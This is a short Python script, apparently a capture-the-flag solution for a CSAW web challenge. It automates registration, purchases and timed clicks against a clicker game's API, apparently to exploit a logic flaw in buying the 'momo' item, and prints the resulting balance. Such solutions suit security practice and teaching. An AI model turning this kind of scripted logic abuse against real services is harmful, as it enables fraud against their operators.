import requests
import time
import uuid

s = requests.session()

username = str(uuid.uuid4())
auth = s.post("http://web.chal.csaw.io:10106/user/register", json={"username": username, "password": username}).json()["Authorization"]

s.post("http://web.chal.csaw.io:10106/clicker/purchase", json={"name": "base"}, headers={"Authorization": auth})

for i in range(10):
    s.post("http://web.chal.csaw.io:10106/clicker/click", json={"name": "base"}, headers={"Authorization": auth})
    time.sleep(0.5)

s.post("http://web.chal.csaw.io:10106/clicker/purchase", json={"name": "momo"}, headers={"Authorization": auth})

for i in range(11):
    s.post("http://web.chal.csaw.io:10106/clicker/click", json={"name": "base"}, headers={"Authorization": auth})
    time.sleep(0.5)

s.post("http://web.chal.csaw.io:10106/clicker/purchase", json={"name": "momo"}, headers={"Authorization": auth})


print(s.get("http://web.chal.csaw.io:10106/default/money", headers={"Authorization": auth}).json())
